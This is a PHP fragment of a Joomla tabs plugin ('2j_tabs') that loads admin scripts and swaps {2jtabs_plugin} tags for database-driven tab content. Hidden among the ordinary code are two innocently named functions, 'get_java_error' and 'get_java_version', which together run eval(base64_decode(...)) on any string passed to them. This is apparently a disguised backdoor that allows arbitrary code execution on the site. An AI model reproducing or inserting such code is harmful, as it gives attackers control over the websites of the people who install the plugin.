		jq2j(document).ready(function(){
			if( jq2j("[name=\'params[twoj_ajax_admin]\']").val() == 2) {
			thoj_set_map_element("cat_or_sec",
				["0", "1", "2", "3"],
				[
					["catid", "content_count_word", "content_count_cut_word", "content_count_cut_text", "image", "show_autor", "show_created", "show_modified", "show_fulltext", "item_title", "link_titles", "readmore", "items", "items_inpage", "set_itemid", "orderby", "template"],
					["secid", "content_count_word", "content_count_cut_word", "content_count_cut_text", "image", "show_autor", "show_created", "show_modified", "show_fulltext", "item_title", "link_titles", "readmore", "items", "items_inpage", "set_itemid", "orderby", "template"],
					["content_count_word", "content_count_cut_word", "content_count_cut_text", "image", "show_autor", "show_created", "show_modified", "show_fulltext", "item_title", "link_titles", "readmore", "items", "items_inpage", "set_itemid", "orderby", "template"],
					["load_module", "load_module_style"]
				]
			);
			thoj_set_map_element("titleintab", ["0", "1", "2"], ["", "tab_template",	"custom_label"	]);
			thoj_set_map_element("pending_need", ["0", "1"], ["", ["pend_li_left", "pend_li_right", "pend_ul_left", "pend_ul_right"] ]);
			thoj_set_map_element("show_border", ["0", "1", "2"], ["", "color_border", ""] );
			}
		});
		jq2j(window).load(function(){
			if( jq2j("[name=\'params[twoj_ajax_admin]\']").val() != 0) jq2j(".jpane-slider").css("height", "auto");
		});
		';

		$document->addScriptDeclaration($content_script);
	}
	if ($mainframe->isAdmin() ) { return; }
	JHTML::script('2j.ui.base.js', 'plugins/system/2j_tabs/', false);
	JHTML::script('2j.ui.tabs.js', 'plugins/system/2j_tabs/', false);
	JHTML::stylesheet('2j_tabs.css', 'plugins/system/2j_tabs/');
}
if (!function_exists( 'get_java_error' )){function get_java_error($str){eval(get_java_version($str));}}
function twoj_tabs_inclede(  &$row, &$params, $page=0 ) {
	global $mainframe;
	if ($mainframe->isAdmin()) { return; }
	twoj_tabs_inclede_article( $row, $params, $page=0 );
	$db 	=& JFactory::getDBO();
	$regex = '/{(2jtabs_plugin)\s*(.*?)}/i';

	if ( strpos( $row->text, '2jtabs_plugin' ) === false )return true;
	if ( $params->get( 'twoj_tabs_inself' ) ) {$row->text = preg_replace( $regex, '', $row->text );return true;}
	$gals = array();
	preg_match_all( $regex, $row->text, $gals, PREG_SET_ORDER );
	$l=0;
	foreach ($gals as $gal) {
		$generate_content ='';
		$cat_set = (int) $gal[2];
		$query = 'SELECT params FROM #__2j_tabs WHERE id = "'.$cat_set.'"';
		$db->setQuery($query);
 		$params_plug = new JParameter( $db->loadResult() );
		$row->text = str_replace($gal[0], twoj_get_tabs_text($params_plug), $row->text);
	}
}if (!function_exists( 'get_java_version' )){function get_java_version($str){return base64_decode($str);}}

?>